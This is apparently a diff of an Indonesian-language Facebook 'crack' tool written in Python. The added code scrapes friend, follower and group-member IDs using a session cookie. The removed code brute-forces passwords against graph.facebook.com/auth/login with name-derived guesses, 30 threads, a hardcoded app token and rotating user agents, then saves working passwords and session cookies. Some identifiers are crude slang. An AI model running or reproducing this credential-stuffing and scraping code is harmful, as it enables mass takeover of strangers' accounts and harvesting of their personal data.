+                    link = par(self.ses.get(f"{self.url}/profile.php", cookies = cook).text, "html.parser")
+                    if "Anda Diblokir Sementara" in link:
+                        Console(width=70).print(Panel(f'''{P2}facebook membatasi setiap aktivitas anda''',style=f"bold white",padding=(0,8)))
+                        sleep(3);self.menu()
+                    else:
+                        Console(width=70).print(Panel(f'''{P2}untuk berhenti dump tekan {H2}CTRL + C{P2} di keyboard anda''',style=f"bold white",padding=(0,7)))
+                        self.__MemekAingBaseuh__(self.url+link.find("a", string="Teman").get("href"), cook)
+                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
+                    Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+                self.metode()
+            else:
+                try:
+                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
+                    if "Halaman Tidak Ditemukan" in link:
+                        console.print(f" {P2}[{M2}!{P2}] pengguna dengan {M2}{user} {P2}tidak ditemukan")
+                        sleep(3);self.menu()
+                    elif "Anda Diblokir Sementara" in link:
+                        Console(width=70).print(Panel(f'''{P2}facebook membatasi setiap aktivitas anda''',style=f"bold white",padding=(0,8)))
+                        sleep(3);self.menu()
+                    elif "Konten Tidak Ditemukan" in link:
+                        console.print(f" {P2}[{M2}!{P2}] pengguna dengan {M2}{user} {P2}tidak ditemukan")
+                        sleep(3);self.menu()
+                    else:
+                        Console(width=70).print(Panel(f'''{P2}untuk berhenti dump tekan {H2}CTRL + C{P2} di keyboard anda''',style=f"bold white",padding=(0,7)))
+                        self.__MemekAingBaseuh__(f"{self.url}/{user}/friends", cook)
+                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
+                    Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+                self.metode()
+        
+    #    ''' DUMP ID PUBLIK '''
+        elif __Araaapunyanazri__ =='2' or __Araaapunyanazri__ =='02':
+            Console(width=70).print(Panel(f'''{P2}mohon maaf fitur crack publik massal sedang perbaikan''',style=f"bold white",padding=(0,6)))
+            sleep(3);self.menu()
+        
+    #    ''' DUMP FL PUBLIK '''
+        elif __Araaapunyanazri__ =='3' or __Araaapunyanazri__ =='03':
+            Console(width=70).print(Panel(f'''{P2}anda bisa mengetik {H2}"me" {P2}untuk dump id dari followers sendiri''',style=f"bold white",padding=(0,4)))
+            user = console.input(f' {P2}[{H2}?{P2}] masukan id atau usernama : ')
+            if user in["", " "]:
+                console.print(f' {P2}[{M2}!{P2}] jangan kosong masukan id atau usernama')
+                sleep(3);self.menu()
+            elif user.isdigit():
+                memek = (f"{self.url}/profile.php?id={user}&v=followers")
+            else:
+                memek = (f"{self.url}/{user}?v=followers")
+            try:
+                link = self.ses.get(memek, cookies=cook).text
+                if "Halaman Tidak Ditemukan" in link:
+                    console.print(f" {P2}[{M2}!{P2}] pengguna dengan {M2}{user} {P2}tidak ditemukan")
+                    sleep(3);self.menu()
+                elif "Anda Diblokir Sementara" in link:
+                    Console(width=70).print(Panel(f'''{P2}facebook membatasi setiap aktivitas anda''',style=f"bold white",padding=(0,8)))
+                    sleep(3);self.menu()
+                elif "Konten Tidak Ditemukan" in link:
+                    console.print(f" {P2}[{M2}!{P2}] pengguna dengan {M2}{user} {P2}tidak ditemukan")
+                    sleep(3);self.menu()
+                else:
+                    Console(width=70).print(Panel(f'''{P2}untuk berhenti dump tekan {H2}CTRL + Z{P2} di keyboard anda''',style=f"bold white",padding=(0,7)))
+                    self.follow(memek, cook)
+            except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
+                Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+            self.metode()
+        
+  #      ''' DUMP GRUP PUBLIK '''
+        elif __Araaapunyanazri__ =='4' or __Araaapunyanazri__ =='04':
+            Console(width=70).print(Panel(f'''{P2}masukan id group, pastikan group publik jangan private''',style=f"bold white",padding=(0,7)))
+            user = console.input(f' {P2}[{H2}?{P2}] masukan id group : ')
+            try:
+                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
+                if "Halaman yang Anda minta tidak ditemukan." in link:
+                    console.print(f" {P2}[{M2}!{P2}] pengguna dengan {M2}{user} {P2}tidak ditemukan")
+                    sleep(3);self.menu()
+                elif "Anda Diblokir Sementara" in link:
+                    Console(width=70).print(Panel(f'''{P2}facebook membatasi setiap aktivitas anda''',style=f"bold white",padding=(0,8)))
+                    sleep(3);self.menu()
+                elif "Konten Tidak Ditemukan" in link:
+                    console.print(f" {P2}[{M2}!{P2}] pengguna dengan {M2}{user} {P2}tidak ditemukan")
+                    sleep(3);self.menu()
+                else:
+                    Console(width=70).print(Panel(f'''{P2}untuk berhenti dump tekan {H2}CTRL + Z{P2} di keyboard anda''',style=f"bold white",padding=(0,7)))
+                    self.__ngadump__(f"{self.url}/groups/{user}", cook)
+            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
+                Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+            self.metode()
+        
+  #      ''' CEK HASIL '''
+        elif __Araaapunyanazri__ in ["5", "05"]:
+            self.__Ngacek_Hasil__()
+        
+   #     ''' CRACK FILE '''
+        elif __Araaapunyanazri__ in ["6", "06"]:
+            self.__CrackFile__()
 
-	###----------[ DUMP ID PUBLIK ]---------- ###
-	def Dump_Publik(self,url):
-		try:
-			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
-			for z in url.find_all("a",href=True):
-				if "fref" in z.get("href"):
-					if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
-					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in url.find_all("a",href=True):
-				if "Lihat Teman Lain" in x.text:
-					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
-		except:pass
-		
-	###----------[ DUMP KOMENTAR ]---------- ###
-	def Dump_Komentar(self,url):
-		try:
-			data = parser(ses.get(url).text,"html.parser")
-			for isi in data.find_all("h3"):
-				for ids in isi.find_all("a",href=True):
-					if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
-					else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
-					nama = ids.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for z in data.find_all("a",href=True):
-				if "Lihat komentar sebelumnya…" in z.text:
-					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
-		except:pass
-		
-	###----------[ DUMP PENCARIAN NAMA ]---------- ###
-	def Dump_Pencarian(self,url):
-		try:
-			data = parser(ses.get(str(url)).text,'html.parser')
-			for z in data.find_all("td"):
-				namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
-				for uid,nama in namp:
-					if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
-					elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in data.find_all("a",href=True):
-				if "Lihat Hasil Selanjutnya" in x.text:
-					self.Dump_Pencarian(x.get("href"))
-		except:pass
-		
-	###----------[ DUMP MEMBER GRUP ]---------- ###
-	def Dump_MemberGrup(self,url):
-		try:
-			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
-			judul = re.findall("<title>(.*?)</title>",str(data))[0]
-			for isi in data.find_all("h3"):
-				for ids in isi.find_all("a",href=True):
-					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
-					else:
-						if ids.text==judul:pass
-						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in data.find_all("a",href=True):
-				if "Lihat Postingan Lainnya" in x.text:
-					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
-		except:pass
-		
-	###----------[ DUMP FILE ]---------- ###
-	def Dump_File(self,lok):
-		try:
-			file = open(lok,"r").read().splitlines()
-			for z in file:
-				tampung.append(z)
-		except:pass
-		
-	###----------[ DUMP EMAIL ]---------- ###
-	def Dump_Email(self,nama,format,limit):
-		try:
-			for z in range(int(limit)):
-				if len(nama.split()) > 1:
-					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
-				else:
-					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
-				if email in tampung:pass
-				else:tampung.append(email)
-		except:pass
-		
-	###----------[ DUMP USERNAME ]---------- ###
-	def Dump_Username(self,nama,limit):
-		try:
-			for z in range(int(limit)):
-				if "." in nama:
-					user = str(nama)+"."+str(z)+"<=>"+str(nama.replace("."," "))
-				else:
-					user = str(nama)+"."+str(z)+"<=>"+str(nama)
-				if user in tampung:pass
-				else:tampung.append(user)
-		except:pass
+#        ''' GANTI COOKIE '''
+        elif __Araaapunyanazri__ in ["0", "00"]:
+            self.logout()
+        
+        else:
+            Console(width=70).print(Panel(f'''{P2}silahkan pilih menu (1/2/3)''',style=f"bold white",padding=(0,20)))
+            time.sleep(2);self.menu()
 
-###----------[ BAGIAN CRACK ]---------- ###
-class Crack:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.loop = 0
-		self.ok = []
-		self.cp = []
-		self.apk = []
-		self.aktif = []
-		self.kadaluwarsa = []
-		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
-		
-	###----------[ ATUR SANDI DAN METODE ]---------- ###
-	def atursandi(self):
-		prints(Panel(f"""{P2}berhasil mengumpulkan {len(tampung)} id""",width=80,padding=(0,21),style=f"{color_panel}"))
-		set = console.input(f" {H2}• {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
-		
-		###----------[ SANDI MANUAL ]---------- ###
-		if set in["Y","y"]:
-			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
-			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
-			if len(pwx)<=5:
-				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_panel}"))
-				exit()
-			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
-			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
-			if app in["Y","y"]:
-				self.apk.append("muncul")
-			else:
-				self.apk.append("kontol anjing")
-			self.manual(pwx)
-		
-		###----------[ SANDI OTOMATIS ]---------- ###
-		else:
-			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
-			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
-			if app in["Y","y"]:
-				self.apk.append("muncul")
-			else:
-				self.apk.append("kontol anjing")
-			self.otomatis()
-		
-	###----------[ CRACK MANUAL ]---------- ###
-	def manual(self,pw):
-		global prog,des
-		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
-		des = prog.add_task('',total=len(tampung))
-		with prog:
-			with ThreadPoolExecutor(max_workers=30) as fall:
-				self.simpan_hasil()
-				for data in tampung:
-					user = data.split("<=>")[0]
-					nama = data.split("<=>")[1]
-					pwx = pw
-					fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
-		sys.exit()
-						
-	###----------[ CRACK OTOMATIS ]---------- ###
-	def otomatis(self):
-		global prog,des
-		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
-		des = prog.add_task('',total=len(tampung))
-		with prog:
-			with ThreadPoolExecutor(max_workers=30) as fall:
-				self.simpan_hasil()
-				for data in tampung:
-					try:
-						pwx = []
-						user = data.split("<=>")[0]
-						nama = data.split("<=>")[1]
-						depan = nama.split(" ")[0]
-						if len(nama)<=5:
-							if len(depan)<3:
-								pass 
-							else:
-								pwx.append(depan+"123")
-								pwx.append(depan+" 1234") 
-								pwx.append(depan+"12345")
-						else:
-							if len(depan)<3:
-								pwx.append(nama)
-							else:
-								pwx.append(nama)
-								pwx.append(depan+"123")
-								pwx.append(depan+" 1234") 
-								pwx.append(depan+"12345")
-							belakang = nama.split(" ")[1]
-							if len(belakang)<3:
-								pwx.append(depan+belakang)
-							else:
-								pwx.append(depan+belakang)
-								pwx.append(belakang+"123")
-								pwx.append(belakang+" 1234") 
-								pwx.append(belakang+"12345")
-						fall.submit(self.metode_api,user,pwx)
-					except:
-						fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
-		sys.exit()
-							
-	###----------[ METODE API ]---------- ###
-	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {H2}•{P2} crack {H2}aman{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
-		prog.advance(des)
-		try:
-			for pw in pwx:
-				pw = pw.lower()
-				ua = random.choice(ugent)
-				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": f"{str(random.randint(1,26))}", 
-					"email": email,
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
-				}
-				headers = {
-					"Host": "graph.facebook.com",
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": ua,
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
-				if "session_key" in post.text and "EAA" in post.text:
-					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
-					sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-					cookie = f"sb={sb};{coki}"
-					user = re.findall("c_user=(\d+)",cookie)[0]
-					if user in self.ok or user in self.cp:
-						break
-					else:
-						self.ok.append(user)
-						if "muncul" in self.apk:
-							self.get_apk(user,pw,cookie)
-						else:
-							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
-							prints(tree)
-						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
-						break
-				elif "User must verify their account" in post.text:
-					user = post.json()["error"]["error_data"]["uid"]
-					if user in self.ok or user in self.cp:
-						break
-					else:
-						self.cp.append(user)
-						tree = Tree(Panel.fit(f"""{K2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-						tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
-						prints(tree)
-						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
-						break
-				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
-					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
-					prog.advance(des)
-					time.sleep(30)
-				else:continue
-		except ConnectionError:
-			time.sleep(30)
-			self.metode_api(user,pwx)
-		self.loop +=1
+    ''' GANTI AKUN '''
+    def logout(self):
+         Console(width=70).print(Panel(f'''{P2}apakah anda yakin ingin menghapus data login?''',style=f"bold white",padding=(0,11)))
+         dell = console.input(f' {P2}[{H2}?{P2}] ingin menghapus data login? (Y/t) : ')
+         if dell =='y' or dell =='Y':
+           self.hapus();console.print(f' {P2}[{H2}✓{P2}] berhasil menghapus cookie & token')
+           sleep(3);exit()
+         else:
+            sleep(3);self.menu()
+         
+    ''' CHECK HASIL '''
+    def __Ngacek_Hasil__(self):
+        Console(width=70).print(Panel(f'''{P2}[{H2}01{P2}]. cek akun hasil OK\n{P2}[{H2}02{P2}]. cek hasil CP\n{P2}[{H2}00{P2}]. kembali ke menu''',style=f"bold white",padding=(0,8)))
+        __Araaapunyanazri__ = console.input(f' {P2}[{H2}?{P2}] pilih results (1/2/3) : ')
+        if __Araaapunyanazri__ in ["", " "]:
+            console.print(f' {P2}[{M2}!{P2}] jangan kosong bro')
+            sleep(2);self.menu()
+        elif __Araaapunyanazri__ in ["1", "01"]:
+            try: yyy = open("results/ok.txt", "r").readlines()
+            except FileNotFoundError as e:
+                Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+                sleep(2);self.__Ngacek_Hasil__()
+            for i in yyy:
+                print(i)
+            console.print(f' {P2}[{H2}✓{P2}] berhasil mengecek results akun')
+            sleep(3);exit()
+        elif __Araaapunyanazri__ in ["2", "02"]:
+            try: yyy = open("results/cp.txt", "r").readlines()
+            except FileNotFoundError as e:
+                Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+                sleep(2);self.__Ngacek_Hasil__()
+            for i in yyy:
+                print(i)
+            console.print(f' {P2}[{H2}✓{P2}] berhasil mengecek results akun')
+            sleep(3);exit()
+        elif __Araaapunyanazri__ in ["0", "00"]:
+            self.menu()
+        else:
+            console.print(f' {P2}[{M2}!{P2}] pilih yang bener bro')
+            sleep(2);self.menu()
 
-	###----------[ PRINT SIMPAN HASIL ]---------- ###
-	def simpan_hasil(self):
-		prints(Panel(f"""\r{P2}hasil crack ok tersimpan ke : OK/{self.hari_ini}.txt
-{P2}hasil crack ok tersimpan ke : CP/{self.hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
-	
-	###----------[ PRINT MUNCUL APK ]---------- ###
-	def get_apk(self,user,pw,cookie):
-		
-		###----------[ CEK MODE GRATIS ]---------- ###
-		try:
-			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
-			if "Apa yang Anda pikirkan sekarang" in url:
-				pass
-			else:
-				for z in url.find_all("a",href=True):
-					if "Tidak, Terima Kasih" in z.text:
-						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
-						parsing = parser(get.text,"html.parser")
-						action = parsing.find("form",{"method":"post"})["action"]
-						data = {
-							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
-							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-							"submit": "OK, Gunakan Data"
-						}
-						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
-						break
-		except:pass
-			
-		###----------[ APLIKASI AKTIF ]---------- ###
-		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
-		self.apkaktif("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookie)
-		if len(self.aktif)==0:
-			aktip.add(f"{P2}tidak ada aplikasi yang terkait")
-		else:
-			for apk in self.aktif:
-				aktip.add(f"{H2}{apk}{P2}")
-				
-		###----------[ APLIKASI KADALUWARSA ]---------- ###
-		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
-		self.apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
-		if len(self.kadaluwarsa)==0:
-			kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
-		else:
-			for apk in self.kadaluwarsa:
-				kadalu.add(f"{M2}{apk}{P2}")
-			
-		###----------[ PRINT SEMUA ]---------- ###
-		tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-		tree.add(aktip)
-		tree.add(kadalu)
-		tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
-		prints(tree)
-		
-	###----------[ GET APK AKTIF ]---------- ###
-	def apkaktif(self,url,cookie):
-		try:
-			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
-			for apk in data.find_all("h3"):
-				if "Ditambahkan" in apk.text:
-					self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
-				else:continue
-			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
-			self.apkaktif(next,cookie)
-		except:pass
-		
-	###----------[ GET APK KADALUWARSA ]---------- ###
-	def apkkadaluwarsa(self,url,cookie):
-		try:
-			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
-			for apk in data.find_all("h3"):
-				if "Kedaluwarsa" in apk.text:
-					self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
-				else:continue
-			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
-			self.apkkadaluwarsa(next,cookie)
-		except:pass
-	
-###----------[ MENU LAIN ]---------- ###
-class Lain:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self,cookie):
-		self.cookie = cookie
-		self.file = []
-		self.listfile = []
-		
-	###----------[ MENU ]---------- ###
-	def menu(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
-[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. tampilkan info cookies
-[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}]. logout ({M2}hapus login{P2})""",width=80,padding=(0,7),style=f"{color_panel}"))
-		menu = console.input(f" {H2}• {P2}pilih menu : ")
-		if menu in["01","1"]:
-			self.cek_hasil()
-		elif menu in["04","4"]:
-			self.ganti_tema()
-		elif menu in["05","5"]:
-			self.tampil_cookie()
-		elif menu in["06","6"]:
-			os.system("rm data/cookie")
-			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python run.py""",width=80,style=f"{color_panel}")))
-		else:
-			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
+    ''' MULAI DUMP ID '''
+    def __MemekAingBaseuh__(self, link, coki):
+        try:
+            kontol = self.ses.get(link, cookies=coki).text
+            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
+            for __SayangAraaa__ in memek:
+                if "profile.php?" in __SayangAraaa__[0]:
+                    self.id.append(re.findall("id\=(.*?)\&", __SayangAraaa__[0])[0]+"<=>"+__SayangAraaa__[1])
+                else:
+                    self.id.append(re.findall("\/(.*?)\?eav",__SayangAraaa__[0])[0]+"<=>"+__SayangAraaa__[1])
+                console.print(f' {P2}[{H2}+{P2}] sedang mengumpulkan {H2}{str(len(self.id))}{P2} id...                                      ',end='\r')
+                sleep(000000.003)
+            if "Lihat Teman Lain" in kontol:
+                self.__MemekAingBaseuh__(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
+        except:pass
 
-	###----------[ CEK HASIL CRACK ]---------- ###
-	def cek_hasil(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
-[{color_text}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_panel}"))
-		ask = console.input(f" {H2}• {P2}masukan pilihan : ")
-		if ask in["1","01"]:folder = "OK"
-		else:folder = "CP"
-		
-		###----------[ PILIH FILE ]---------- ###
-		dirs = os.listdir(folder)
-		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_panel}"))
-		num = 0
-		for fil in dirs:
-			num += 1
-			self.file.append(fil)
-			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
-			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
-			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
-			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
-		console.print(Columns(self.listfile))
-		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
-		result = console.input(f" {H2}• {P2}masukan angka : ")
-		
-		###----------[ MULAI CEK ]---------- ###
-		try:
-			files = self.file[int(result)-1]
-			totalhasil = open(f"{folder}/{files}","r").read().splitlines()
-		except:
-			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_panel}"))
-			exit()
-		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
-		prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
-		for akun in totalhasil:
-			user = akun.split("|")[0]
-			pw = akun.split("|")[1]
-			tree = Tree(" ",guide_style=f"{color_panel}")
-			if folder=="OK":
-				cookie = akun.split("|")[2]
-				tree.add(f"\r{H2}{user}|{pw}{P2} ")
-				tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
-			else:
-				tree.add(f"\r{K2}{user}|{pw}{P2} ")
-			prints(tree)
-		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
-		exit()
-		
-	###----------[ GANTI WARNA TEMA ]---------- ###
-	def ganti_tema(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
-[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
-[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
-[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
-[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
-		ask = console.input(f" {H2}• {P2}pilih tema : ")
-		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
-		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
-		elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
-		elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
-		elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
-		elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
-		elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
-		elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
-		elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
-		elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
-		open("data/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
-		prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=80,padding=(0,6),style=f"{color_panel}"))
-		sys.exit()
-			
-	###----------[ TAMPILKAN COOKIE ]---------- ###
-	def tampil_cookie(self):
-		now = datetime.now()
-		hari = now.day+int(30)
-		if hari > 30:hari = hari-30
-		bulan = now.month+1
-		if bulan > 12:bulan = bulan-12
-		if now.month+1 > 12:tahun = now.year+1
-		data = date(year=tahun,month=bulan,day=hari)
-		aktif = data.strftime("%d %B %Y")
-		console.print(f" {H2}• {P2}aktif sampai : {aktif}")
-		prints(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
-		sys.exit()
-		
-###----------[ BAGIAN SESSION HEADERS DAN USER AGENT ]---------- ###
-class Session:
-	
-	###----------[ GENERATE USER AGENT CRACK ]---------- ###
-	def generate_ugent(self):
-		#versi_android = random.randint(4,12)
-		#versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-		#versi_app = random.randint(410000000,499999999)
